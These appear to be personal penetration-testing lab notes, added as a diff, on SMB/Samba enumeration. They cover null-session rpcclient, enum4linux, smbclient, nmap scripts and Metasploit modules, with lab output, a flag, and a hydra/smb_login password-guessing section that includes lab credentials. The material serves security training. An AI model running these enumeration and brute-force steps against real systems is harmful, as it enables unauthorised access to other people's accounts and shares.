@@ -932,3 +932,606 @@ Stappenplan:
 -   Gebruik `rpcclient -U "" -N {targetip}` om verbinding te maken met de RPC-service met een null session.
 
 
+#####  SMB: Samba 2
+
+- Run service scan on open ports to identify samba 
+- run: **rpcclient -U "" -N {Target ip}**
+			- -   `-U ""`: Specifies an empty username for the connection.
+			-   `-N`: Instructs `rpcclient` to use a null session (i.e., without authentication).
+			-   `{Target ip}`: Placeholder for the IP address or hostname of the target system
+	- run: srvinfo (gives info about OS)  - exit 
+- run: **enum4linux** -o {target ip}
+	- "enum4linux": Dit is een tool die wordt gebruikt voor het enumereren van informatie over Windows- en Samba-systemen. Het voert verschillende opdrachten uit om informatie op te halen zoals gebruikerslijsten, groepslijsten, sharelijsten en andere details.
+	- Het "-o" argument wordt gebruikt om de verzamelde informatie op te slaan in een uitvoerbestand
+- run:  **smbclient -L {target IP}** 
+- run: **nmap {target} -p 445 --script smb-protocols** 
+- run: **msfconsole** 
+	- use auxiliary/scanner/smb/smb2 
+	- set RHOSTS {target ip} 
+	- options 
+	- run 
+	- write the info you see 
+- run a script for enumerating users: **nmap {ip} -p 445 --script smb-enum-users** 
+- run: **enum4linux -U {target}**   (enum4linux -h for options) 
+- run: **rpcclient -U "" -N {Target ip}** 
+	- enumdomusers 
+	- lookupnames amin 
+
+--------  LAB ---------- 
+
+
+Target ip: 192.65.249.3 
+
+Questions
+
+1.  Find the OS version of samba server using rpcclient.
+   
+	   	root@attackdefense:~# rpcclient -U "" -N 192.65.249.3
+			rpcclient $> srvinfo
+			        SAMBA-RECON    Wk Sv PrQ Unx NT SNT samba.recon.lab
+			        platform_id     :       500
+			        os version      :       6.1  📍
+			        server type     :       0x809a03 
+   
+   
+2.  Find the OS version of samba server using enum4Linux.
+   
+		root@attackdefense:~# enum4linux -o 192.65.249.3
+		Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May 16 06:37:54 2023
+		
+		 ========================== 
+		|    Target Information    |
+		 ========================== 
+		Target ........... 192.65.249.3
+		RID Range ........ 500-550,1000-1050
+		Username ......... ''
+		Password ......... ''
+		Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+		
+		
+		 ==================================================== 
+		|    Enumerating Workgroup/Domain on 192.65.249.3    |
+		 ==================================================== 
+		[+] Got domain/workgroup name: RECONLABS
+		
+		 ===================================== 
+		|    Session Check on 192.65.249.3    |
+		 ===================================== 
+		[+] Server 192.65.249.3 allows sessions using username '', password ''
+
+		
+		 ====================================== 
+		|    OS information on 192.65.249.3    |
+		 ====================================== 
+		Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+		[+] Got OS info for 192.65.249.3 from smbclient: 
+		[+] Got OS info for 192.65.249.3 from srvinfo:
+		        SAMBA-RECON    Wk Sv PrQ Unx NT SNT samba.recon.lab
+		        platform_id     :       500
+		        os version      :       6.1 📍
+		        server type     :       0x809a03
+		enum4linux complete on Tue May 16 06:37:54 2023
+   
+   
+3.  Find the server description of samba server using smbclient.
+   
+		   root@attackdefense:~# smbclient -L 192.65.249.3
+		Enter WORKGROUP\GUEST's password: 
+		
+		        Sharename       Type      Comment
+		        ---------       ----      -------
+		        public          Disk      
+		        john            Disk      
+		        aisha           Disk      
+		        emma            Disk      
+		        everyone        Disk      
+		        IPC$            IPC       IPC Service (samba.recon.lab)
+		Reconnecting with SMB1 for workgroup listing.
+		
+		        Server               Comment
+		        ---------            -------
+		
+		        Workgroup            Master
+		        ---------            -------
+		        RECONLABS            SAMBA-RECON
+   
+   
+4.  Is NTLM 0.12 (SMBv1) dialects supported by the samba server? Use appropriate nmap script.
+   
+		   root@attackdefense:~# nmap 192.65.249.3 -p 445 --script smb-protocols
+		PORT    STATE SERVICE
+		445/tcp open  microsoft-ds
+		MAC Address: 02:42:C0:41:F9:03 (Unknown)
+		
+		Host script results:
+		| smb-protocols: 
+		|   dialects: 
+		|     NT LM 0.12 (SMBv1) [dangerous, but default] 📍
+		|     2.02
+		|     2.10
+		|     3.00
+		|     3.02
+		|_    3.11
+
+   
+   
+   
+5.  Is SMB2 protocol supported by the samba server? Use smb2 metasploit module.
+   
+   
+		   msf5 auxiliary(scanner/smb/smb2) > run
+		
+		[+] 192.65.249.3:445      - 192.65.249.3 supports SMB 2 [dialect 255.2] and has been 📍online for 3702414 hours
+		[*] 192.65.249.3:445      - Scanned 1 of 1 hosts (100% complete)
+		[*] Auxiliary module execution completed
+		   
+		   
+   
+6.  List all users that exists on the samba server  using appropriate nmap script.
+   
+		   root@attackdefense:~# nmap 192.65.249.3 -p 445 --script smb-enum-users
+		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 06:53 UTC
+		Nmap scan report for target-1 (192.65.249.3)
+		Host is up (0.000051s latency).
+		
+		PORT    STATE SERVICE
+		445/tcp open  microsoft-ds
+		MAC Address: 02:42:C0:41:F9:03 (Unknown)
+		
+		Host script results:
+		| smb-enum-users: 
+		|   SAMBA-RECON\admin (RID: 1005)
+		|     Full name:   
+		|     Description: 
+		|     Flags:       Normal user account
+		|   SAMBA-RECON\aisha (RID: 1004)
+		|     Full name:   
+		|     Description: 
+		|     Flags:       Normal user account
+		|   SAMBA-RECON\elie (RID: 1002)
+		|     Full name:   
+		|     Description: 
+		|     Flags:       Normal user account
+		|   SAMBA-RECON\emma (RID: 1003)
+		|     Full name:   
+		|     Description: 
+		|     Flags:       Normal user account
+		|   SAMBA-RECON\john (RID: 1000)
+		|     Full name:   
+		|     Description: 
+		|     Flags:       Normal user account
+		|   SAMBA-RECON\shawn (RID: 1001)
+		|     Full name:   
+		|     Description: 
+		|_    Flags:       Normal user account
+   
+
+   
+7.  List all users that exists on the samba server  using smb_enumusers metasploit modules.
+   
+      
+		  msf5 auxiliary(scanner/smb/smb_enumusers) > run
+		
+		[+] 192.65.249.3:139      - SAMBA-RECON [ john, elie, aisha, shawn, emma, admin ] ( LockoutTries=0 PasswordMin=5 )
+		[*] 192.65.249.3:         - Scanned 1 of 1 hosts (100% complete)
+		[*] Auxiliary module execution completed
+		   
+   
+   
+   
+   
+   
+8.  List all users that exists on the samba server using enum4Linux.
+   
+		   root@attackdefense:~# enum4linux -U 192.65.249.3
+		Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May 16 06:55:13 2023
+		
+		 ========================== 
+		|    Target Information    |
+		 ========================== 
+		Target ........... 192.65.249.3
+		RID Range ........ 500-550,1000-1050
+		Username ......... ''
+		Password ......... ''
+		Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+		
+		
+		 ==================================================== 
+		|    Enumerating Workgroup/Domain on 192.65.249.3    |
+		 ==================================================== 
+		[+] Got domain/workgroup name: RECONLABS
+		
+		 ===================================== 
+		|    Session Check on 192.65.249.3    |
+		 ===================================== 
+		[+] Server 192.65.249.3 allows sessions using username '', password ''
+		
+		 =========================================== 
+		|    Getting domain SID for 192.65.249.3    |
+		 =========================================== 
+		Domain Name: RECONLABS
+		Domain Sid: (NULL SID)
+		[+] Can't determine if host is part of domain or part of a workgroup
+		
+		 ============================= 
+		|    Users on 192.65.249.3    |
+		 ============================= 
+		index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: john     Name:   Desc: 
+		index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elie     Name:   Desc: 
+		index: 0x3 RID: 0x3ec acb: 0x00000010 Account: aisha    Name:   Desc: 
+		index: 0x4 RID: 0x3e9 acb: 0x00000010 Account: shawn    Name:   Desc: 
+		index: 0x5 RID: 0x3eb acb: 0x00000010 Account: emma     Name:   Desc: 
+		index: 0x6 RID: 0x3ed acb: 0x00000010 Account: admin    Name:   Desc: 
+		
+		user:[john] rid:[0x3e8]
+		user:[elie] rid:[0x3ea]
+		user:[aisha] rid:[0x3ec]
+		user:[shawn] rid:[0x3e9]
+		user:[emma] rid:[0x3eb]
+		user:[admin] rid:[0x3ed]
+		enum4linux complete on Tue May 16 06:55:13 2023
+   
+
+   
+9.  List all users that exists on the samba server  using rpcclient.
+  
+		root@attackdefense:~# rpcclient -U "" -N 192.65.249.3
+		rpcclient $> enumdomusers
+		user:[john] rid:[0x3e8]
+		user:[elie] rid:[0x3ea]
+		user:[aisha] rid:[0x3ec]
+		user:[shawn] rid:[0x3e9]
+		user:[emma] rid:[0x3eb]
+		user:[admin] rid:[0x3ed]
+
+
+   
+10.  Find SID of user “admin” using rpcclient.
+
+	rpcclient $> lookupnames admin
+	admin S-1-5-21-4056189605-2085045094-1961111545-1005 (User: 1)
+
+
+
+
+-----
+
+#### SMB 3 
+
+- run to show shares: **nmap {target ip} -p 445 --script smb-enum-shares** 
+- run msfconsole: **use auxiliary/scanner/smb/smb_enumshares** 
+	- set rhosts 
+	- show options (make sure that everything with a yes is filled in)
+	- exploit 
+	- exit 
+- run: **enum4linux -S {ip}** 
+- run: **smbclient -L {target} -N**   (-N = nullsession)
+- run: **enum4linux -G {target}** 
+- run: **rpcclient -U "" -N {target}** 
+	- enumdomgroups
+- run: smbclient //target/Public -N 
+	- when you are in: hulp 
+	- ls en cd 
+
+
+-- LAB --- 
+
+**target ip: 192.125.191.3**  
+
+Questions
+
+1.  List all available shares on the samba server using Nmap script.
+   
+		 root@attackdefense:~# nmap 192.125.191.3 -p 445 --script smb-enum-shares
+				Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 07:35 UTC
+				Nmap scan report for target-1 (192.125.191.3)
+				Host is up (0.000076s latency).
+		
+		PORT    STATE SERVICE
+		445/tcp open  microsoft-ds
+		MAC Address: 02:42:C0:7D:BF:03 (Unknown)
+		
+		Host script results:
+		| smb-enum-shares: 
+		|   account_used: guest
+		|   \\192.125.191.3\IPC$: 
+		|     Type: STYPE_IPC_HIDDEN
+		|     Comment: IPC Service (samba.recon.lab)
+		|     Users: 1
+		|     Max Users: <unlimited>
+		|     Path: C:\tmp
+		|     Anonymous access: READ/WRITE
+		|     Current user access: READ/WRITE
+		|   \\192.125.191.3\aisha: 
+		|     Type: STYPE_DISKTREE
+		|     Comment: 
+		|     Users: 0
+		|     Max Users: <unlimited>
+		|     Path: C:\samba\aisha
+		|     Anonymous access: <none>
+		|     Current user access: <none>
+		|   \\192.125.191.3\emma: 
+		|     Type: STYPE_DISKTREE
+		|     Comment: 
+		|     Users: 0
+		|     Max Users: <unlimited>
+		|     Path: C:\samba\emma
+		|     Anonymous access: <none>
+		|     Current user access: <none>
+		|   \\192.125.191.3\everyone: 
+		|     Type: STYPE_DISKTREE
+		|     Comment: 
+		|     Users: 0
+		|     Max Users: <unlimited>
+		|     Path: C:\samba\everyone
+		|     Anonymous access: <none>
+		|     Current user access: <none>
+		|   \\192.125.191.3\john: 
+		|     Type: STYPE_DISKTREE
+		|     Comment: 
+		|     Users: 0
+		|     Max Users: <unlimited>
+		|     Path: C:\samba\john
+		|     Anonymous access: <none>
+		|     Current user access: <none>
+		|   \\192.125.191.3\public: 
+		|     Type: STYPE_DISKTREE
+		|     Comment: 
+		|     Users: 0
+		|     Max Users: <unlimited>
+		|     Path: C:\samba\public
+		|     Anonymous access: READ/WRITE
+		|_    Current user access: READ/WRITE
+   
+   
+   
+   
+   
+2.  List all available shares on the samba server using smb_enumshares Metasploit module.
+
+		     msf5 auxiliary(scanner/smb/smb_enumshares) > exploit
+		
+		[+] 192.125.191.3:445     - public - (DS) 
+		[+] 192.125.191.3:445     - john - (DS) 
+		[+] 192.125.191.3:445     - aisha - (DS) 
+		[+] 192.125.191.3:445     - emma - (DS) 
+		[+] 192.125.191.3:445     - everyone - (DS) 
+		[+] 192.125.191.3:445     - IPC$ - (I) IPC Service (samba.recon.lab)
+		[*] 192.125.191.3:        - Scanned 1 of 1 hosts (100% complete)
+		[*] Auxiliary module execution completed
+
+
+
+   
+3.  List all available shares on the samba server using enum4Linux.
+   
+		   
+		root@attackdefense:~# enum4linux -S 192.125.191.3 
+		Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May 16 07:40:24 2023
+		
+		 ========================== 
+		|    Target Information    |
+		 ========================== 
+		Target ........... 192.125.191.3
+		RID Range ........ 500-550,1000-1050
+		Username ......... ''
+		Password ......... ''
+		Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+		
+		
+		 ===================================================== 
+		|    Enumerating Workgroup/Domain on 192.125.191.3    |
+		 ===================================================== 
+		[+] Got domain/workgroup name: RECONLABS
+		
+		 ====================================== 
+		|    Session Check on 192.125.191.3    |
+		 ====================================== 
+		[+] Server 192.125.191.3 allows sessions using username '', password ''
+		
+		 ============================================ 
+		|    Getting domain SID for 192.125.191.3    |
+		 ============================================ 
+		Domain Name: RECONLABS
+		Domain Sid: (NULL SID)
+		[+] Can't determine if host is part of domain or part of a workgroup
+		
+		 ========================================== 
+		|    Share Enumeration on 192.125.191.3    |
+		 ========================================== 
+		
+		        Sharename       Type      Comment
+		        ---------       ----      -------
+		        public          Disk      
+		        john            Disk      
+		        aisha           Disk      
+		        emma            Disk      
+		        everyone        Disk      
+		        IPC$            IPC       IPC Service (samba.recon.lab)
+		Reconnecting with SMB1 for workgroup listing.
+		
+		        Server               Comment
+		        ---------            -------
+		
+		        Workgroup            Master
+		        ---------            -------
+		        RECONLABS            SAMBA-RECON
+		
+		[+] Attempting to map shares on 192.125.191.3
+		//192.125.191.3/public  Mapping: OK, Listing: OK
+		//192.125.191.3/john    Mapping: DENIED, Listing: N/A
+		//192.125.191.3/aisha   Mapping: DENIED, Listing: N/A
+		//192.125.191.3/emma    Mapping: DENIED, Listing: N/A
+		//192.125.191.3/everyone        Mapping: DENIED, Listing: N/A
+		//192.125.191.3/IPC$    [E] Can't understand response:
+		NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+		enum4linux complete on Tue May 16 07:40:24 2023
+   
+   
+   
+   
+4.  List all available shares on the samba server using smbclient.
+   
+		   root@attackdefense:~# smbclient -L 192.125.191.3 -N
+		
+		        Sharename       Type      Comment
+		        ---------       ----      -------
+		        public          Disk      
+		        john            Disk      
+		        aisha           Disk      
+		        emma            Disk      
+		        everyone        Disk      
+		        IPC$            IPC       IPC Service (samba.recon.lab)
+		Reconnecting with SMB1 for workgroup listing.
+		
+		        Server               Comment
+		        ---------            -------
+		
+		        Workgroup            Master
+		        ---------            -------
+		        RECONLABS            SAMBA-RECON
+   
+   
+   
+5.  Find domain groups that exist on the samba server by using enum4Linux.
+	   
+		   root@attackdefense:~# enum4linux -G 192.125.191.3
+		Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May 16 07:58:24 2023
+		
+		 ========================== 
+		|    Target Information    |
+		 ========================== 
+		Target ........... 192.125.191.3
+		RID Range ........ 500-550,1000-1050
+		Username ......... ''
+		Password ......... ''
+		Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+	
+		
+		 ===================================================== 
+		|    Enumerating Workgroup/Domain on 192.125.191.3    |
+		 ===================================================== 
+		[+] Got domain/workgroup name: RECONLABS 📍
+		
+		 ====================================== 
+		|    Session Check on 192.125.191.3    |
+		 ====================================== 
+		[+] Server 192.125.191.3 allows sessions using username '', password ''
+		
+		 ============================================ 
+		|    Getting domain SID for 192.125.191.3    |
+		 ============================================ 
+		Domain Name: RECONLABS
+		Domain Sid: (NULL SID)
+		[+] Can't determine if host is part of domain or part of a workgroup
+		
+		 =============================== 
+		|    Groups on 192.125.191.3    |
+		 =============================== 
+		
+		[+] Getting builtin groups:
+		
+		[+] Getting builtin group memberships:
+		
+		[+] Getting local groups:
+		group:[Testing] rid:[0x3f0]
+		
+		[+] Getting local group memberships:
+		
+		[+] Getting domain groups:
+		group:[Maintainer] rid:[0x3ee] 📍
+		group:[Reserved] rid:[0x3ef] 📍
+		
+		[+] Getting domain group memberships:
+		enum4linux complete on Tue May 16 07:58:24 2023
+	
+
+   
+   
+6.  Find domain groups that exist on the samba server by using rpcclient.
+   
+   
+		   root@attackdefense:~# rpcclient -U "" -N 192.125.191.3
+		rpcclient $> enumdomgroups
+		group:[Maintainer] rid:[0x3ee]
+		group:[Reserved] rid:[0x3ef]
+   
+   
+   
+   
+   
+   
+7.  Is samba server configured for printing?
+   
+   
+run: enum4linux -i {targetip} 
+   
+   
+   
+   
+   
+8.  How many directories are present inside share “public”?
+   
+		   root@attackdefense:~# smbclient //192.125.191.3/Public -N
+		Try "help" to get a list of possible commands.
+		smb: \> ls
+		  .                                   D        0  Tue May 16 07:35:39 2023
+		  ..                                  D        0  Tue Nov 27 13:36:13 2018
+		  dev                                 D        0  Tue Nov 27 13:36:13 2018
+		  secret                              D        0  Tue Nov 27 13:36:13 2018
+
+   
+   
+   
+9.  Fetch the flag from samba server. 
+
+03ddb97933e716f5057a18632badb3b4 
+
+
+use more to read content and q to get out of 
+![[Pasted image 20230516101232.png]]
+
+
+#### SMB Dictonary Attack 
+- wordlist = list of passwords e.g. rocky 
+- Enumerate smb share: 
+	- run: msfconsole 
+	- use auxiliary/scanner/smb/smb_login 
+	- info (uitleg van module)
+	- options 
+	- set rhosts {target} 
+	- set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt 
+	- set smbuser {jane}
+	- options 
+	- run 
+	- exit 
+- run this commmand first: *gzip -d /usr/share/wordlists/rockyou.txt.gz* 
+		Specifiek wordt hier het bestand "rockyou.txt.gz" uitgepakt, dat zich bevindt in de map "/usr/share/wordlists/". Na uitvoering van dit commando zal het zip bestand "rockyou.txt.gz" worden uitgepakt en zal het resulterende ongecomprimeerde bestand "rockyou.txt" in dezelfde map worden geplaatst. Het ".gz" -extensie geeft aan dat het bestand gecomprimeerd is met gzip-compressie 
+- run: *hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz  {target} smb*
+			- de tool Hydra wordt gebruikt om een aanval uit te voeren op een inlogpagina met behulp van een lijst met wachtwoorden.
+			-  "-l admin" geeft aan dat de gebruikersnaam die wordt gebruikt tijdens de aanval "admin" is. Dit kan worden gewijzigd naar de gewenste gebruikersnaam. De vlag '-l' wordt gebruikt om de gebruikersnaam op te geven die wordt gebruikt tijdens het uitvoeren van een aanval. 
+			-  -P /usr/share/wordlists/rockyou.txt.gz" geeft de locatie aan van het wachtwoordenbestand dat zal worden gebruikt tijdens de aanval. In dit geval wordt het bestand "rockyou.txt.gz" gebruikt, dat zich bevindt in de map "/usr/share/wordlists/". Dit bestand bevat een lijst met mogelijke wachtwoorden die worden uitgepakt door het commando. De vlag '-P' wordt gebruikt om het wachtwoordenbestand op te geven dat wordt gebruikt tijdens het uitvoeren van de aanval. 
+- run: *smbmap -H {target} -u admin -p password1* 
+- find out of any of the share are browsable: ***smbclient -L {target} -U jane  (password is 123abc)***
+- run: smbclient //target/jane -U jane 
+- ls 
+- run: smbclient //target/admin -U admin 
+![[Pasted image 20230516103627.png]]
+- first get file then exit smb > ls > use tar -xf flag.tar.gz 
+	- Het commando "tar -xf flag.tar.gz" wordt gebruikt om een gecomprimeerd archiefbestand met de extensie ".tar.gz" uit te pakken met behulp van het programma 'tar'. 
+	- -   "tar" is het opdrachtregelhulpprogramma dat wordt gebruikt voor het beheren van archiefbestanden.
+	-  "-xf" zijn de opties voor 'tar':
+	    -   De optie 'x' staat voor extract, wat betekent dat we het archief willen uitpakken.
+	    -   De optie 'f' gevolgd door het bestandsnaamargument "flag.tar.gz" geeft aan dat we het specifieke archiefbestand willen uitpakken.
+- enumerate pipes: 
+	- msfconsole 
+	- use auxiliary/scanner/smb/pipe_auditor 
+		- The "msfconsole: auxiliary/scanner/smb/pipe_auditor" module in Metasploit is used for auditing named pipes on remote systems accessible via the Server Message Block (SMB) protocol. It attempts to discover vulnerable or misconfigured named pipes that can be exploited for unauthorized access or information disclosure. 
+		- pipeline auditing refers to the process of examining and evaluating the security and configuration of named pipes in a system or network. Named pipes are a form of interprocess communication (IPC) mechanism that allows communication between different processes or applications on a system.
+		  
+	- set smbuser admin 
+	- set smbpass password1 
+	- set rhost target 
+	- options 
+	- run 
+- 
